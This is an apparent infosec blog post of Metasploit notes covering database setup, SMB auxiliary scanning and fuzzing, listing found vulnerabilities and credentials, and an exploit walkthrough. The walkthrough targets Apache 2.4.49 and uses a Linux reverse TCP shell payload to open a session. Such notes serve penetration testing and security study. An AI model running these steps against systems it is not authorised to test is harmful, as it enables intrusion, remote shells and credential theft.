---
layout: post
title: Metsploit Modules
titledate: 09/25/23
tags: ["infosec", "info_gathering", "offsec", "metasploit"]
---

#### setup

start the db

    $ sudo msfdb init

enabe db at boot

    $ sudo systemctl enable postgresql

startup

    $ sudo msfconsole

check db connectio

    msf> db_status

list commands

    msf> help

#### auxiliary

aux modules include scanning, sniffing, and fuzzing capabilities

    msf> show auxiliary

search for a type

    msf> search type:auxiliary smb

once found we can enter the module by path/name or number

    msf> use 22

    msf> use /auxiliary/fuzzers/smb/smb_tree_connect

next we can gain information about the module

    msf> info

and then what arguments it takes and requires

    msf> show options

we can manually set a target

    msf> set RHOSTS 192.168.1.1

or use previously disovered hosts

    msf> unset RHOSTS

    msf> services -p 445 --rhosts

we execute the module

    msf> run

check vulns detected with 

    msf> vulns

any creds discovered can be listed with

    msf> creds

#### exploit

let's assume we've scanned a host and identified it is vulnerable to a specific exploit

we begin by startig a new workspace for this specific attack surface

    msf> workspace -a exploits

then we can search for related exploits to the software

    msf> search Apache 2.4.49

we load the exploit module

    msf> use 1

now see required and optional arguments

    msf> show options

we can set our payload, host and port

    msf> set payload payload/linux/x64/shell_reverse_tcp

    msf> set RPORT 80

    msf> set RHOSTS 192.168.1.1

and execute

    msf> run

if a session is succesful and established, we can ctrl+z to background the session

to interact with it

    msf> sesssions -l

    msf> session -i 2

we then have a host of commands depending on the platform and session opened to us
